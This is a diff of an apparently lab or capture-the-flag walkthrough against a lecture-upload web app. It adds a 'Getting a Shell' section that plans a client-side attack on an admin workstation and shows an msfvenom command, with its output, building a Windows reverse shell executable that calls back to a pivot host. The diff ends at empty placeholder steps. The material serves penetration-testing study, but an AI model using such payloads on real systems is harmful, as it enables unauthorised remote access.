@@ -798,7 +798,7 @@ The access of a professor has 3 more functions in the dashboard:
 
 ### 5.2. Generate GPG key
 
-GPG is used to encrypt uploaded lectures and there's a hint suggesting that uploading a file may be interesting
+In the `Change Public Key` page: GPG is used to encrypt uploaded lectures and there's a hint suggesting that uploading a file may be interesting
 
 > Please note that providing an invalid gpg file will prevent us from verifying the uploaded lectures in the feature and will cause errors...
 
@@ -850,9 +850,9 @@ root@kali:~# gpg --export -a george > george.asc
 
 ![image](https://github.com/user-attachments/assets/43d3c850-5cfb-45ad-a15b-f80c22b423a5)
 
-### 5.3. Upload lecture file
+### 5.3. Getting a Shell
 
-Selecting `Manage My Courses` shows the list of courses under the account:
+The `Manage My Courses` page shows the list of courses under the account:
 
 ![image](https://github.com/user-attachments/assets/85e87026-4f22-4822-ad52-dbe8b3a77c45)
 
@@ -860,3 +860,27 @@ Selecting `Learn More` on a course leads to `Add a new lecture`:
 
 ![image](https://github.com/user-attachments/assets/ac459d37-1271-4a09-b54b-a030e13bfe12)
 
+This is very likely to be a "client-side" attack where an admin would open the attachment to inspect it
+1. The target `WS-3` was found previously, where `wao` has user-level access to
+2. The admin would probably be inspecting the attachment from `WS-3`, guessing that `WS` would mean "workstation"
+3. `WS-3` is in the `192.168.99.12` subnet, which will likely not have connectivity to Kali → so the reverse shell listener should run on `LAB-2`
+
+#### 5.3.1. Generate a reverse shell executable that points to `LAB-2`
+
+```console
+root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.99.12 LPORT=4444 -f exe -o /var/www/html/reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: /var/www/html/reverse.exe
+```
+
+#### 5.3.2. Place the payload with the user-level access that `wao` has on `WS-3`
+
+```pwsh
+
+```
+
+#### 5.3.3. 
